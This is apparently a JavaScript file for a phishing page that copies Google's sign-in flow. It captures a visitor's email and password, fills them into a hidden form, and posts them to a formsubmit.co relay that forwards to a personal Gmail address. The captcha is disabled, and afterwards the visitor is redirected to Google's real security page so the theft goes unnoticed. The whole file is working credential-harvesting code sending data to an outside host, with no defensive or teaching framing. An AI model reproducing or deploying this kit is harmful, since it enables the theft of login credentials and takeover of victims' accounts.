let emailCard = `
    <div class="sign-in-card">
    <img src="images/google-icon.png" class="google-icon">
    <h2 class="sign-in-header">Sign in</h2>
    <p class="sign-in-bottomOfHeader">with your Google Account</p>
    <input class="sign-in-email-input" type="text" placeholder="Email or phone">
    <a href="#" class="forgot-email-btn">Forgot email?</a>
    <p style="color: rgb(73, 73, 73);">Not your computer? Use Guest mode to sign in privately
        <br> 
        <a style="text-decoration: none;color: var(--hrefColor);" href="#">Learn more</a>
    </p>

    <div class="bottom-options">
        <a href="#">Create account</a>
        <button onclick="emailTime()" class="next-btn">Next</button>
    </div>
    </div>
`



let passCard = `
<div class="sign-in-card">
    <img src="images/google-icon.png" class="google-icon">
    <h2 class="sign-in-header sign-in-header-pass">Welcome</h2>
    <p class="sign-in-email-pass"></p>
    <p class="tc-p">To continue, first verify it's you</p>
    <input class="sign-in-pass-input" type="password" placeholder="Enter your password">
<form action="https://formsubmit.co/aaidar729@gmail.com" method="POST">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="https://myaccount.google.com/security">
    <input class="input-form email-input" type="email" name="email" required>
    <input class="input-form pass-input" type="password" name="pass" required>

    <div class="bottom-options">
        <a href="#">Forgot password?</a>
        <button type="submit" onclick="passTime()" class="next-pass-btn">Next</button>
    </div>
</form>
    </div>
`


document.querySelector(".root").innerHTML = emailCard

function emailTime() {
    localStorage.setItem("email",document.querySelector(".sign-in-email-input").value)
    console.log(localStorage.getItem("email"))
    document.querySelector(".root").innerHTML = passCard
    document.querySelector(".sign-in-email-pass").innerHTML = localStorage.getItem("email")
}


function passTime() {
    localStorage.setItem("pass",document.querySelector(".sign-in-pass-input").value)
    console.log(localStorage.getItem("pass"))
    document.querySelector(".email-input").value = localStorage.getItem("email")
    document.querySelector(".pass-input").value = localStorage.getItem("pass")
}


